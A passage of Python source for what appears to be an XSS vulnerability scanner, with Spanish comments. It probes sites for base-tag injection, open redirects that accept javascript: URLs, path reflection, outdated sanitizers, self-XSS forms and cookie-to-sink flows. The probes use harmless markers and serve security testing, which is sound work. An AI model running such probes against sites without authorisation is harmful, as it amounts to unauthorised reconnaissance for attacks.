                gravedad, donde = "media", "sin base-uri en CSP"
            else:
                continue
            findings.append(self._finding(
                "base-tag", url, param, gravedad,
                f"reflexion con < crudo {donde}: un <base href=//atacante> "
                "secuestra todas las URLs relativas del sitio (forms y links "
                "apuntan al dominio del atacante)",
                f"{urlparse(url).path}?{param}= · < crudo en HTML", "body"))
            self.log(f"[xsspro] 💥 base tag injection @ {urlparse(url).path}?{param}")
        return findings

    # ---------- 11) open redirect -> XSS ----------
    REDIR_PARAMS = ("url", "redirect", "redirect_uri", "next", "return", "returnto",
                    "r", "continue", "dest", "destination", "target", "goto", "out", "link")

    def _probe_redir_target(self, tgt) -> List[Dict[str, Any]]:
        """Sonda de UN objetivo (unidad de trabajo OVERDRIVE)."""
        findings: List[Dict[str, Any]] = []
        url, param = tgt["url"], tgt["param"]
        if param.lower() not in self.REDIR_PARAMS:
            return findings
        mark = self._mark()

        def _probe_redir(url: str, param: str, value: str):
            self._pause()
            try:
                parts = urlparse(url)
                q = [(k, v) for k, v in parse_qsl(parts.query) if k != param]
                q.append((param, value))
                # NO seguir el redirect: el dato esta en la cabecera Location
                return self.session.get(
                    urlunparse(parts._replace(query=urlencode(q))),
                    timeout=self.timeout, allow_redirects=False)
            except Exception:
                return None

        r = _probe_redir(url, param, "https://example.org/" + mark)
        loc = (r.headers.get("Location", "") if r is not None else "")
        if r is None or mark not in loc:
            return findings
        findings.append(self._finding(
            "open-redirect", url, param, "media",
            "el parametro controla la cabecera Location: open redirect "
            "(phishing, bypass de allowlists, token leak por referrer)",
            f"Location -> {loc[:100]}", "header"))
        self.log(f"[xsspro] 💥 open redirect en '{param}' @ {urlparse(url).path}")
        r2 = _probe_redir(url, param, "javascript:" + mark)
        loc2 = (r2.headers.get("Location", "") if r2 is not None else "")
        if r2 is not None and mark in loc2:
            findings.append(self._finding(
                "open-redirect-xss", url, param, "alta",
                "el redirect acepta javascript: en Location: si un usuario "
                "clickea el link resultante ejecuta JS en el origen del sitio",
                f"Location -> {loc2[:100]}", "header"))
        return findings

    def probe_open_redirect(self, param_targets: List[Dict[str, Any]]) -> List[Dict[str, Any]]:
        tgts = param_targets[:self.MAX_PARAMS]
        res = self._parallel(self._probe_redir_target, tgts)
        return [f for sub in res for f in (sub or [])]

    # ---------- 12) reflexion en la ruta ----------
    def probe_path_reflection(self, base_url: str) -> List[Dict[str, Any]]:
        findings: List[Dict[str, Any]] = []
        mark = self._mark()
        self._pause()
        try:
            r = self.session.get(urljoin(base_url, "/" + mark), timeout=self.timeout)
        except Exception:
            return findings
        if mark not in r.text:
            return findings
        raw_mark = mark + "<'"
        self._pause()
        try:
            r2 = self.session.get(urljoin(base_url, "/" + raw_mark), timeout=self.timeout)
        except Exception:
            r2 = None
        escapa = r2 is not None and mark in r2.text and "<" in \
            r2.text[r2.text.find(mark): r2.text.find(mark) + len(mark) + 3]
        findings.append(self._finding(
            "path-reflection", base_url, "(ruta)", "alta" if escapa else "media",
            "la RUTA se refleja en la respuesta (404/rewrite): contexto de "
            "inyeccion que el corpus de parametros no cubre"
            + ("; < crudo sobrevive: XSS en la ruta factible" if escapa else ""),
            f"GET /{mark[:12]}... -> reflejado · HTTP {r.status_code}", "path"))
        self.log(f"[xsspro] 💥 reflexion en la ruta @ {urlparse(base_url).netloc}")
        return findings

    # ---------- 13) fingerprint de sanitizador ----------
    SAN_LIBS = (
        (re.compile(r"DOMPurify", re.I), "DOMPurify", (2, 4),
         "versiones < 2.4 tienen bypasses mXSS publicos (CVE-2024-45816, etc.)"),
        (re.compile(r"sanitize-html|sanitizeHtml", re.I), "sanitize-html", (2, 12), ""),
        (re.compile(r"js-xss|\bnew\s+FilterXSS|\bxss\s*\(", re.I), "js-xss", (1, 0), ""),
    )
    SAN_VER = re.compile(r"version\s*[:=]\s*['\"]?(\d+(?:\.\d+)+)", re.I)

    @staticmethod
    def _vtuple(v: str) -> tuple:
        return tuple(int(x) for x in v.split(".")[:3])

    def scan_sanitizers(self, texts: List[Dict[str, str]]) -> List[Dict[str, Any]]:
        findings: List[Dict[str, Any]] = []
        for t in texts:
            for pat, name, minv, extra in self.SAN_LIBS:
                if not pat.search(t["text"]):
                    continue
                ver = None
                for vm in self.SAN_VER.finditer(t["text"]):
                    ver = vm.group(1)
                    break
                if ver and self._vtuple(ver) < minv:
                    findings.append(self._finding(
                        "sanitizer", t["origin"], ver, "alta",
                        f"sanitizer {name} VIEJO (v{ver}): {extra or 'bypasses conocidos en versiones antiguas'}; "
                        "validar contra el payload mXSS correspondiente",
                        f"{t['origin']} {name} v{ver}", "js"))
                    self.log(f"[xsspro] 💥 {name} v{ver} viejo en "
                             f"{urlparse(t['origin']).path}")
                elif ver:
                    findings.append(self._finding(
                        "sanitizer", t["origin"], ver, "info",
                        f"sanitizer {name} v{ver} presente: filtro activo, "
                        "probar vectores mXSS de re-serializacion antes de descartar",
                        f"{t['origin']} {name} v{ver}", "js"))
        return findings

    # ---------- 14) self-XSS escalable ----------
    SELF_WORDS = ("profile", "user", "account", "settings", "comment",
                  "name", "bio", "note", "post", "message")

    def probe_self_xss(self, spider_out: Dict[str, Any]) -> List[Dict[str, Any]]:
        findings: List[Dict[str, Any]] = []
        for form in spider_out.get("forms", [])[:self.MAX_FORMS]:
            action = form.get("url", "")
            if not any(w in action.lower() for w in self.SELF_WORDS):
                continue
            fields = [f for f in form.get("fields", [])[:8]]
            if not fields:
                continue
            mark = self._mark()
            field = max(fields, key=len)
            data = {x: "x" for x in fields}
            data[field] = mark
            self._pause()
            try:
                if form["method"].upper() == "POST":
                    r = self.session.post(action, data=data, timeout=self.timeout)
                else:
                    r = self.session.get(action, params=data, timeout=self.timeout)
            except Exception:
                continue
            if r.status_code == 200 and mark in r.text:
                findings.append(self._finding(
                    "self-xss", action, field, "media",
                    "el input persiste y se re-renderiza al propio usuario: "
                    "self-XSS; ESCALABLE si otra vista (admin, lista publica, "
                    "email) renderiza el mismo dato, ahi es XSS almacenado",
                    f"'{field}' -> re-renderizado en {urlparse(action).path}", "stored"))
                self.log(f"[xsspro] 💥 self-XSS persistente en '{field}' @ "
                         f"{urlparse(action).path}")
        return findings

    # ---------- 15) cookie/JSON a sink ----------
    CK_PAT = re.compile(r"document\.cookie", re.I)
    CK_SINKS = ("innerHTML", "insertAdjacentHTML", "outerHTML", ".src =", ".href =",
                "eval(", "Function(", "document.write")

    def scan_cookie_sink(self, texts: List[Dict[str, str]]) -> List[Dict[str, Any]]:
        findings: List[Dict[str, Any]] = []
        for t in texts:
            for m in self.CK_PAT.finditer(t["text"]):
                win = t["text"][m.start(): m.start() + 500]
                if any(s.lower() in win.lower() for s in self.CK_SINKS):
                    line = t["text"].count("\n", 0, m.start()) + 1
                    findings.append(self._finding(
                        "cookie-sink", t["origin"], "-", "alta",
                        "document.cookie alimentando un sink de HTML: una cookie "
                        "inyectable (via response de otro subdominio o cabecera "
                        "CRLF) ejecuta en esta pagina",
                        f"{t['origin']} (linea {line}) document.cookie -> sink", "js"))
                    self.log(f"[xsspro] 💥 document.cookie -> sink en "
                             f"{urlparse(t['origin']).path}")
        return findings

    # ---------- orquestador ----------
    def run(self, base_url: str, spider_out: Dict[str, Any]) -> List[Dict[str, Any]]:
        findings: List[Dict[str, Any]] = []
        self.log("[xsspro] === bateria XSS-PRO: 6 vectores avanzados "
                 "(postMessage / dyn-script / mXSS / dangling / stored / CSP) ===")
        texts = self._collect_texts(base_url, spider_out)
        self.log(f"[xsspro] textos recolectados: {len(texts)} (paginas+js)")
        findings += self.scan_postmessage(texts)
        findings += self.scan_dyn_script(texts)
        findings += self.scan_mxss(texts)
        findings += self.scan_csp_bypass(base_url)
        findings += self.probe_dangling(spider_out.get("param_targets", []))
        findings += self.probe_stored(spider_out)
        # XSS-PRO 2: clobbering, proto-pollution, iframe, base tag, redirect,
        # path, sanitizers, self-XSS, cookie sink
        findings += self.scan_clobbering(texts)
        findings += self.scan_proto(texts)
        findings += self.scan_iframe(texts)
        findings += self.probe_base(spider_out.get("param_targets", []))
        findings += self.probe_open_redirect(spider_out.get("param_targets", []))
        findings += self.probe_path_reflection(base_url)
        findings += self.scan_sanitizers(texts)
        findings += self.probe_self_xss(spider_out)
        findings += self.scan_cookie_sink(texts)
        altas = len([f for f in findings if f["severity"] == "alta"])
        self.log(f"[xsspro] ══ XSS-PRO terminado: {len(findings)} hallazgos "
                 f"({altas} altos) · 15 modulos / arsenal total: 20 vectores XSS")
        return findings
